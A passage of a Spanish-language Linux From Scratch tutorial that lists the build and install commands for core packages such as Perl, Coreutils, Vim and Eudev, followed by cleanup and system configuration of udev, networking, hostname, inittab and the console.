Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr        \
            --localstatedir=/var \
            --disable-logger     \
            --disable-whois      \
            --disable-rcp        \
            --disable-rexec      \
            --disable-rlogin     \
            --disable-rsh        \
            --disable-servers

make
make check
make install

mv -v /usr/bin/{hostname,ping,ping6,traceroute} /bin
mv -v /usr/bin/ifconfig /sbin
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

Sacaremos otra Snapshot antes de compilar el siguiente paquete:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34boh.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Perl en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
echo &quot;127.0.0.1 localhost $(hostname)&quot; &gt; /etc/hosts

export BUILD_ZLIB=False
export BUILD_BZIP2=0

sh Configure -des -Dprefix=/usr                 \
                  -Dvendorprefix=/usr           \
                  -Dman1dir=/usr/share/man/man1 \
                  -Dman3dir=/usr/share/man/man3 \
                  -Dpager=&quot;/usr/bin/less -isR&quot;  \
                  -Duseshrplib                  \
                  -Dusethreads

make
make test
make install
unset BUILD_ZLIB BUILD_BZIP2
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### XML Parser en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
perl Makefile.PL
make
make test
make install
```

Como veis, es importante por ello tener bien compilado previamente el paquete de **Perl**.

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Intltool en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i 's:\\\${:\\\$\\{:' intltool-update.in

./configure --prefix=/usr

make
make check
make install

install -v -Dm644 doc/I18N-HOWTO /usr/share/doc/intltool-0.51.0/I18N-HOWTO
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Autoconf en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed '361 s/{/\\{/' -i bin/autoscan.in

./configure --prefix=/usr

make
make check # Es posible que salgan errores, pero no hay de qué preocuparse
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Automake en LFS

**AVISO**: Este paquete puede tardar bastante, así que toca armarse una vez más de paciencia.

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --docdir=/usr/share/doc/automake-1.16.1


make
make -j4 check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Kmod en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr          \
            --bindir=/bin          \
            --sysconfdir=/etc      \
            --with-rootlibdir=/lib \
            --with-xz              \
            --with-zlib

make
make install

for target in depmod insmod lsmod modinfo modprobe rmmod; do
  ln -sfv ../bin/kmod /sbin/$target
done

ln -sfv kmod /bin/lsmod
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Gettext en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr    \
            --disable-static \
            --docdir=/usr/share/doc/gettext-0.20.1

make
make check
make install

chmod -v 0755 /usr/lib/preloadable_libintl.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Libelf de Elfutils en LFS

Este paquete corresponde al que tiene nombre `elfutils-0.178.tar.bz2`.

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --disable-debuginfod

make
make check # Es posible que salgan errores, pero no hay de qué preocuparse

make -C libelf install
install -vm644 config/libelf.pc /usr/lib/pkgconfig
rm /usr/lib/libelf.a
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Libffi en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --disable-static --with-gcc-arch=native

make
make check # Es posible que salgan errores, pero no hay de qué preocuparse
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Openssl en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./config --prefix=/usr         \
         --openssldir=/etc/ssl \
         --libdir=lib          \
         shared                \
         zlib-dynamic

make
make test # Es posible que nos salgan fallos, pero no hay de qué preocuparse

sed -i '/INSTALL_LIBS/s/libcrypto.a libssl.a//' Makefile
make MANSUFFIX=ssl install

mv -v /usr/share/doc/openssl /usr/share/doc/openssl-1.1.1d
cp -vfr doc/* /usr/share/doc/openssl-1.1.1d
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Python3 en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr       \
            --enable-shared     \
            --with-system-expat \
            --with-system-ffi   \
            --with-ensurepip=yes

make
make install

make install
chmod -v 755 /usr/lib/libpython3.8.so
chmod -v 755 /usr/lib/libpython3.so
ln -sfv pip3.8 /usr/bin/pip3

install -v -dm755 /usr/share/doc/python-3.8.1/html 

tar --strip-components=1  \
    --no-same-owner       \
    --no-same-permissions \
    -C /usr/share/doc/python-3.8.1/html \
    -xvf ../python-3.8.1-docs-html.tar.bz2
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Ninja en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
export NINJAJOBS=4

sed -i '/int Guess/a \
  int   j = 0;\
  char* jobs = getenv( &quot;NINJAJOBS&quot; );\
  if ( jobs != NULL ) j = atoi( jobs );\
  if ( j &gt; 0 ) return j;\
' src/ninja.cc

python3 configure.py --bootstrap

./ninja ninja_test
./ninja_test --gtest_filter=-SubprocessTest.SetWithLots

install -vm755 ninja /usr/bin/
install -vDm644 misc/bash-completion /usr/share/bash-completion/completions/ninja
install -vDm644 misc/zsh-completion  /usr/share/zsh/site-functions/_ninja
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Meson en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
python3 setup.py build

python3 setup.py install --root=dest
cp -rv dest/* /
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Coreutils en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../coreutils-8.31-i18n-1.patch

sed -i '/test.lock/s/^/#/' gnulib-tests/gnulib.mk

autoreconf -fiv
FORCE_UNSAFE_CONFIGURE=1 ./configure \
            --prefix=/usr            \
            --enable-no-install-program=kill,uptime

make
make NON_ROOT_USERNAME=nobody check-root

echo &quot;dummy:x:1000:nobody&quot; &gt;&gt; /etc/group
chown -Rv nobody . 

su nobody -s /bin/bash \
          -c &quot;PATH=$PATH make RUN_EXPENSIVE_TESTS=yes check&quot; # Es posible que aparezcan errores, pero no hay de qué preocuparse

sed -i '/dummy/d' /etc/group

make install

mv -v /usr/bin/{cat,chgrp,chmod,chown,cp,date,dd,df,echo} /bin
mv -v /usr/bin/{false,ln,ls,mkdir,mknod,mv,pwd,rm} /bin
mv -v /usr/bin/{rmdir,stty,sync,true,uname} /bin
mv -v /usr/bin/chroot /usr/sbin
mv -v /usr/share/man/man1/chroot.1 /usr/share/man/man8/chroot.8
sed -i s/\&quot;1\&quot;/\&quot;8\&quot;/1 /usr/share/man/man8/chroot.8

mv -v /usr/bin/{head,nice,sleep,touch} /bin
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Check en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr
make
make check

make docdir=/usr/share/doc/check-0.14.0 install &amp;&amp;
sed -i '1 s/tools/usr/' /usr/bin/checkmk
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Diffutils en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Gawk en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i 's/extras//' Makefile.in

./configure --prefix=/usr

make
make check
make install

mkdir -v /usr/share/doc/gawk-5.0.1
cp    -v doc/{awkforai.txt,*.{eps,pdf,jpg}} /usr/share/doc/gawk-5.0.1
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Findutils en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --localstatedir=/var/lib/locate

make
make check # Este comando puede mostrar algunos errores, pero no hay de qué preocuparse
make install

mv -v /usr/bin/find /bin
sed -i 's|find:=${BINDIR}|find:=/bin|' /usr/bin/updatedb
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Groff en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
PAGE=A4 ./configure --prefix=/usr
make -j1
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### GRUB en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr          \
            --sbindir=/sbin        \
            --sysconfdir=/etc      \
            --disable-efiemu       \
            --disable-werror

make
make install

mv -v /etc/bash_completion.d/grub /usr/share/bash-completion/completions
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Less en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --sysconfdir=/etc

make
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Gzip en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make check # Es posible que aparezcan fallos, pero no hay de qué preocuparse
make install

mv -v /usr/bin/gzip /bin
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Zstd en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
make
make prefix=/usr install

rm -v /usr/lib/libzstd.a
mv -v /usr/lib/libzstd.so.* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libzstd.so) /usr/lib/libzstd.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### IPRoute en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i /ARPD/d Makefile
rm -fv man/man8/arpd.8

sed -i 's/.m_ipt.o//' tc/Makefile

make
make DOCDIR=/usr/share/doc/iproute2-5.5.0 install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Kbd en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../kbd-2.2.0-backspace-1.patch

sed -i 's/\(RESIZECONS_PROGS=\)yes/\1no/g' configure
sed -i 's/resizecons.8 //' docs/man/man8/Makefile.in

PKG_CONFIG_PATH=/tools/lib/pkgconfig ./configure --prefix=/usr --disable-vlock

make
make check
make install

mkdir -v       /usr/share/doc/kbd-2.2.0
cp -R -v docs/doc/* /usr/share/doc/kbd-2.2.0
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Libpipeline en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Make en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make PERL5LIB=$PWD/tests/ check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Patch en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### MAN DB en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr                        \
            --docdir=/usr/share/doc/man-db-2.9.0 \
            --sysconfdir=/etc                    \
            --disable-setuid                     \
            --enable-cache-owner=bin             \
            --with-browser=/usr/bin/lynx         \
            --with-vgrind=/usr/bin/vgrind        \
            --with-grap=/usr/bin/grap            \
            --with-systemdtmpfilesdir=           \
            --with-systemdsystemunitdir=

make
make check
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Tar en LFS

**AVISO**: La instalación de este paquete puede demorar un buen rato.

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
FORCE_UNSAFE_CONFIGURE=1  \
./configure --prefix=/usr \
            --bindir=/bin

make
make check
make install

make -C doc install-html docdir=/usr/share/doc/tar-1.32
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Texinfo en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr --disable-static

make
make check
make install

make TEXMF=/usr/share/texmf install-tex

pushd /usr/share/info
rm -v dir
for f in *
  do install-info $f dir 2&gt;/dev/null
done
popd
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Vim en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
echo '#define SYS_VIMRC_FILE &quot;/etc/vimrc&quot;' &gt;&gt; src/feature.h

./configure --prefix=/usr

make

chown -Rv nobody .
su nobody -s /bin/bash -c &quot;LANG=en_US.UTF-8 make -j1 test&quot; &amp;&gt; vim-test.log
make install

ln -sv vim /usr/bin/vi
for L in  /usr/share/man/{,*/}man1/vim.1; do
    ln -sv vim.1 $(dirname $L)/vi.1
done

ln -sv ../vim/vim82/doc /usr/share/doc/vim-8.2.0190

cat &gt; /etc/vimrc &lt;&lt; &quot;EOF&quot;
&quot; Begin /etc/vimrc

&quot; Ensure defaults are set before customizing settings, not after
source $VIMRUNTIME/defaults.vim
let skip_defaults_vim=1 

set nocompatible
set backspace=2
set mouse=
syntax on
if (&amp;term == &quot;xterm&quot;) || (&amp;term == &quot;putty&quot;)
  set background=dark
endif

&quot; End /etc/vimrc
EOF
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Procps en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr                            \
            --exec-prefix=                           \
            --libdir=/usr/lib                        \
            --docdir=/usr/share/doc/procps-ng-3.3.15 \
            --disable-static                         \
            --disable-kill

make

sed -i -r 's|(pmap_initname)\\\$|\1|' testsuite/pmap.test/pmap.exp
sed -i '/set tty/d' testsuite/pkill.test/pkill.exp
rm testsuite/pgrep.test/pgrep.exp
make check

make install

mv -v /usr/lib/libprocps.so.* /lib
ln -sfv ../../lib/$(readlink /usr/lib/libprocps.so) /usr/lib/libprocps.so
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Util Linux en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
mkdir -pv /var/lib/hwclock

./configure ADJTIME_PATH=/var/lib/hwclock/adjtime   \
            --docdir=/usr/share/doc/util-linux-2.35.1 \
            --disable-chfn-chsh  \
            --disable-login      \
            --disable-nologin    \
            --disable-su         \
            --disable-setpriv    \
            --disable-runuser    \
            --disable-pylibmount \
            --disable-static     \
            --without-python     \
            --without-systemd    \
            --without-systemdsystemunitdir

make

chown -Rv nobody .
su nobody -s /bin/bash -c &quot;PATH=$PATH make -k check&quot;

make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### E2fsprogs en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
mkdir -v build
cd build

../configure --prefix=/usr           \
             --bindir=/bin           \
             --with-root-prefix=&quot;&quot;   \
             --enable-elf-shlibs     \
             --disable-libblkid      \
             --disable-libuuid       \
             --disable-uuidd         \
             --disable-fsck

make
make check
make install

chmod -v u+w /usr/lib/{libcom_err,libe2p,libext2fs,libss}.a

gunzip -v /usr/share/info/libext2fs.info.gz
install-info --dir-file=/usr/share/info/dir /usr/share/info/libext2fs.info

makeinfo -o      doc/com_err.info ../lib/et/com_err.texinfo
install -v -m644 doc/com_err.info /usr/share/info
install-info --dir-file=/usr/share/info/dir /usr/share/info/com_err.info
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Sysklogd en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
sed -i '/Error loading kernel symbols/{n;n;d}' ksym_mod.c
sed -i 's/union wait/int/' syslogd.c

make

make BINDIR=/sbin install

cat &gt; /etc/syslog.conf &lt;&lt; &quot;EOF&quot;
# Begin /etc/syslog.conf

auth,authpriv.* -/var/log/auth.log
*.*;auth,authpriv.none -/var/log/sys.log
daemon.* -/var/log/daemon.log
kern.* -/var/log/kern.log
mail.* -/var/log/mail.log
user.* -/var/log/user.log
*.emerg *

# End /etc/syslog.conf
EOF
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Sysvinit en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
patch -Np1 -i ../sysvinit-2.96-consolidated-1.patch

make
make install
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

##### Eudev en LFS

Para la instalación de este paquete, una vez descomprimido el comprimido correspondiente, ejecutaremos los siguientes comandos:

```bash
./configure --prefix=/usr           \
            --bindir=/sbin          \
            --sbindir=/sbin         \
            --libdir=/usr/lib       \
            --sysconfdir=/etc       \
            --libexecdir=/lib       \
            --with-rootprefix=      \
            --with-rootlibdir=/lib  \
            --enable-manpages       \
            --disable-static

make

mkdir -pv /lib/udev/rules.d
mkdir -pv /etc/udev/rules.d

make check
make install

tar -xvf ../udev-lfs-20171102.tar.xz
make -f udev-lfs-20171102/Makefile.lfs install

udevadm hwdb --update
```

Una vez finalizada la instalación, retrocedemos los directorios necesarios y borramos el directorio principal del descomprimido.

Ya en este punto, creamos una Snapshot:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bSs.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Limpieza Final

Comenzaremos colocando los símbolos de depuración para las bibliotecas seleccionadas en archivos separados:

```bash
save_lib=&quot;ld-2.31.so libc-2.31.so libpthread-2.31.so libthread_db-1.0.so&quot;

cd /lib

for LIB in $save_lib; do
    objcopy --only-keep-debug $LIB $LIB.dbg 
    strip --strip-unneeded $LIB
    objcopy --add-gnu-debuglink=$LIB.dbg $LIB 
done    

save_usrlib=&quot;libquadmath.so.0.0.0 libstdc++.so.6.0.27
             libitm.so.1.0.0 libatomic.so.1.2.0&quot; 

cd /usr/lib

for LIB in $save_usrlib; do
    objcopy --only-keep-debug $LIB $LIB.dbg
    strip --strip-unneeded $LIB
    objcopy --add-gnu-debuglink=$LIB.dbg $LIB
done

unset LIB save_lib save_usrlib
```

Antes de realizar la eliminación, deberemos tener especial cuidado para asegurarnos de que ninguno de los binarios que están a punto de ser borrados se estén ejecutando:

```bash
exec /tools/bin/bash
```

Una vez hecho, ahora los binarios y las bibliotecas se pueden quitar de forma segura:

```bash
/tools/bin/find /usr/lib -type f -name \*.a \
   -exec /tools/bin/strip --strip-debug {} ';'

/tools/bin/find /lib /usr/lib -type f \( -name \*.so* -a ! -name \*dbg \) \
   -exec /tools/bin/strip --strip-unneeded {} ';'

/tools/bin/find /{bin,sbin} /usr/{bin,sbin,libexec} -type f \
    -exec /tools/bin/strip --strip-all {} ';'
```

Finalmente, limpiamos algunos archivos adicionales que quedan de las pruebas en ejecución:

```bash
rm -rf /tmp/*
```

Y ya en este punto, lo que haremos será cerrar sesión y volver a ingresar al entorno chroot con un comando chroot esta vez actualizado.

**IMPORTANTE**: A partir de ahora, en caso de necesitar volver a ingresar al entorno chroot tras salir, deberemos de ejecutar el comando que indico a continuación:

```bash
exit

chroot &quot;$LFS&quot; /usr/bin/env -i          \
    HOME=/root TERM=&quot;$TERM&quot;            \
    PS1='(lfs chroot) \u:\w\$ '        \
    PATH=/bin:/usr/bin:/sbin:/usr/sbin \
    /bin/bash --login
```

Una vez dentro, eliminaremos las siguientes biliotecas estáticas las cuales pueden ser borradas sin problema:

```bash
rm -f /usr/lib/lib{bfd,opcodes}.a
rm -f /usr/lib/libbz2.a
rm -f /usr/lib/lib{com_err,e2p,ext2fs,ss}.a
rm -f /usr/lib/libltdl.a
rm -f /usr/lib/libfl.a
rm -f /usr/lib/libz.a
```

Así como los archivos instalados en los directorios '*/usr/lib*' y '*/usr/libexec*':

```bash
find /usr/lib /usr/libexec -name \*.la -delete
```

#### Configuración del sistema
##### Instalación de LFS Bootscripts

Lo que haremos será dirigirnos al directorio '*/sources*' y descomprimir el comprimido correspondiente para este paquete. Una vez descomprimido, aplicaremos el siguiente comando:

```bash
make install
```

##### Gestión de dispositivos

Comenzaremos creando unas reglas de **Udev** personalizadas. Para ello, ejecutaremos los siguientes comandos:

```bash
bash /lib/udev/init-net-rules.sh
cat /etc/udev/rules.d/70-persistent-net.rules
```

Deberíamos ver un output como el siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bTu.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Sobre este archivo, efectuaremos un pequeño cambio. Como podréis apreciar en la imagen de arriba, el nombre de la interfaz es **enp0s3**, en mi caso lo voy a llamar **eth0**, por tanto abriremos el archivo, lo cambiaremos y posteriormente volveremos a ejecutar los mismos comandos:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bTN.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez hecho, ejecutaremos los siguientes comandos:

```bash
udevadm test /sys/block/sr0

sed -i -e 's/&quot;write_cd_rules&quot;/&quot;write_cd_rules by-id&quot;/' \
    /etc/udev/rules.d/83-cdrom-symlinks.rules
```

Deberíamos ver un output como el siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUo.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

El archivo situado en `/etc/udev/rules.d/83-cdrom-symlinks.rules` debe de tener el siguiente contenido:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUp.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por último, para manejar dispositivos duplicados, ejecutaremos el siguiente comando:

```bash
cat &gt; /etc/udev/rules.d/83-duplicate_devs.rules &lt;&lt; &quot;EOF&quot;

# Persistent symlinks for webcam and tuner
KERNEL==&quot;video*&quot;, ATTRS{idProduct}==&quot;1910&quot;, ATTRS{idVendor}==&quot;0d81&quot;, \
    SYMLINK+=&quot;webcam&quot;
KERNEL==&quot;video*&quot;, ATTRS{device}==&quot;0x036f&quot;, ATTRS{vendor}==&quot;0x109e&quot;, \
    SYMLINK+=&quot;tvtuner&quot;

EOF
```

##### Creación de archivos de configuración de interfaz de red

Nos dirigiremos a la ruta `/etc/sysconfig` y nos crearemos un fichero con nombre `ifconfig.eth0` que posea la siguiente estructura:

```bash
cat &gt; ifconfig.eth0 &lt;&lt; &quot;EOF&quot;
ONBOOT=yes
IFACE=eth0
SERVICE=ipv4-static
IP=192.168.1.2
GATEWAY=192.168.1.1
PREFIX=24
BROADCAST=192.168.1.255
EOF
```

En mi caso, lo adaptaré a mi segmento de red:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUP.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por otro lado, añadiremos el archivo `/etc/resolv.conf` con el siguiente contenido:

```bash
cat &gt; /etc/resolv.conf &lt;&lt; &quot;EOF&quot;
# Begin /etc/resolv.conf

domain &lt;Your Domain Name&gt;
nameserver &lt;IP address of your primary nameserver&gt;
nameserver &lt;IP address of your secondary nameserver&gt;

# End /etc/resolv.conf
EOF
```

Obviamente, cambiaremos sus valores a los correspondientes:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bUZ.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Configurando el nombre de host del sistema

Durante el proceso de arranque, el archivo `/etc/hostname` se usa para establecer el nombre de host del sistema.

Lo que haremos será crear este archivo donde ingresaremos nuestro nombre de host:

```bash
echo &quot;s4viOS&quot; &gt; /etc/hostname
```

Por otro lado, nos crearemos el archivo `/etc/hosts` con el siguiente contenido:

```bash
cat &gt; /etc/hosts &lt;&lt; &quot;EOF&quot;
# Begin /etc/hosts

127.0.0.1 localhost
127.0.1.1 &lt;FQDN&gt; &lt;HOSTNAME&gt;
&lt;192.168.1.1&gt; &lt;FQDN&gt; &lt;HOSTNAME&gt; [alias1] [alias2 ...]
::1       localhost ip6-localhost ip6-loopback
ff02::1   ip6-allnodes
ff02::2   ip6-allrouters

# End /etc/hosts
EOF
```

Posteriormente, lo adaptaremos a nuestras necesidades:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bW6.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Configurando el Sysvinit

Durante la inicialización del núcleo, el primer programa que se ejecuta se especifica en la línea de comando o, por defecto, **init**. Este programa lee el archivo de inicialización '*/etc/inittab*'.

La idea será crear este archivo con el siguiente contenido:

```bash
cat &gt; /etc/inittab &lt;&lt; &quot;EOF&quot;
# Begin /etc/inittab

id:3:initdefault:

si::sysinit:/etc/rc.d/init.d/rc S

l0:0:wait:/etc/rc.d/init.d/rc 0
l1:S1:wait:/etc/rc.d/init.d/rc 1
l2:2:wait:/etc/rc.d/init.d/rc 2
l3:3:wait:/etc/rc.d/init.d/rc 3
l4:4:wait:/etc/rc.d/init.d/rc 4
l5:5:wait:/etc/rc.d/init.d/rc 5
l6:6:wait:/etc/rc.d/init.d/rc 6

ca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now

su:S016:once:/sbin/sulogin

1:2345:respawn:/sbin/agetty --noclear tty1 9600
2:2345:respawn:/sbin/agetty tty2 9600
3:2345:respawn:/sbin/agetty tty3 9600
4:2345:respawn:/sbin/agetty tty4 9600
5:2345:respawn:/sbin/agetty tty5 9600
6:2345:respawn:/sbin/agetty tty6 9600

# End /etc/inittab
EOF
```

##### Configuración del reloj del sistema

Crearemos un archivo en '*/etc/sysconfig/clock*' con el siguiente contenido:

```bash
cat &gt; /etc/sysconfig/clock &lt;&lt; &quot;EOF&quot;
# Begin /etc/sysconfig/clock

UTC=1

# Set this to any options you might need to give to hwclock,
# such as machine hardware clock type for Alphas.
CLOCKPARAMS=

# End /etc/sysconfig/clock
EOF
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bWL.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Configuración de la consola de Linux

En este punto, configuraremos el script de consola que configura el mapa del teclado, la fuente de la consola y el nivel de registro del kernel de la consola.

Nos crearemos un archivo en `/etc/sysconfig/console` con el siguiente contenido (cada uno lo puede adaptar a sus necesidades):

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXf.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Creando archivo rc site

Este archivo se sitúa en '*/etc/sysconfig/rc.site*' y ya posee contenido. Lo que haremos será cambiar algunas cosas de este archivo.

Empezaremos por los siguientes datos:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXJ.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Posteriormente, descomentaremos las siguientes líneas:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34bXW.png&quot;&gt;
